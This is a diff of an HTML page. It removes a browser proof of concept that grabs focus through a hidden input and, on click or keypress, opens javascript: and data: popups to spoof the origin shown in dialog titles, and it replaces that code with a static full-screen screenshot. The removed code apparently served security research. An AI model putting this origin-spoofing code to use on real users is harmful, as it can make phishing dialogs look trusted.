@@ -1,70 +1,26 @@
-
-
-<!doctype html>
-<html>
+<!DOCTYPE html> 
+<html lang="en">
 <head>
-<style>
-html { font-family: sans-serif; }
-#focusElem { opacity: 0.00001; width:1px; height:1px; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Full Page Screenshot</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden; /* Prevent scrolling or overflow */
+        }
+
+        img.fullscreen {
+            height: 100vh;
+            width: 100vw;
+            object-fit: cover;
+            display: block;
+        }
+    </style>
 </head>
 <body>
-
-<p> <span id="originOutput"></span></p>
-
-<input id="focusElem">
-
-<script>
-
-originOutput.innerText = window.location.origin;
-
-var scenario = 'popup'; // Default scenario
-var query = window.location.search;
-
-if (query) {
-  scenario = query.substr(1); // Strip leading '?'
-}
-
-var newWinParams = 'width=800,height=400,top=100';
-
-var runPoC = () => {
-
-  if (scenario == 'popup') {
-    window.open('javascript:alert("See dialog title for origin spoof. This dialog is from doc.domain: "+document.domain+", win.origin: "+window.origin)', '_blank', newWinParams);
-  } else if (scenario == 'tab') {
-    window.open('javascript:alert("See dialog title for origin spoof. This dialog is from doc.domain: "+document.domain+", win.origin: "+window.origin)');
-  } else if (scenario == 'data') {
-    var win = window.open('data:,Hello', '_blank', newWinParams);
-    setTimeout(() => {
-      win.alert('JS dialog from iframe, origin: '+window.origin);
-    }, 100);
-  } else if (scenario == 'protocol') {
-    var win = window.open('test:', '_blank', newWinParams);
-    setTimeout(() => {
-      win.alert('JS dialog from iframe, origin: '+window.origin);
-    }, 100);
-  } else if (scenario == 'docwrite1') {
-    // Results in renderer kill: bad_message::RFH_CAN_COMMIT_URL_BLOCKED
-    var win = window.open('javascript:document.write("test")', '_blank', newWinParams);
-  } else if (scenario == 'docwrite2') {
-    // Results in renderer kill: bad_message::RFH_INVALID_ORIGIN_ON_COMMIT
-    var win = window.open('data:,Hello', '_blank', newWinParams);
-    setTimeout(() => {
-      win.document.write('test');
-    }, 100);
-  }
-
-}
-
-setInterval(() => {
-  focusElem.focus();
-}, 100);
-
-focusElem.addEventListener('keypress', runPoC);
-
-window.addEventListener('click', runPoC);
-
-</script>
+    <img class="fullscreen" src="screenshot.jpg" alt="Dog Screenshot">
 </body>
 </html>
-
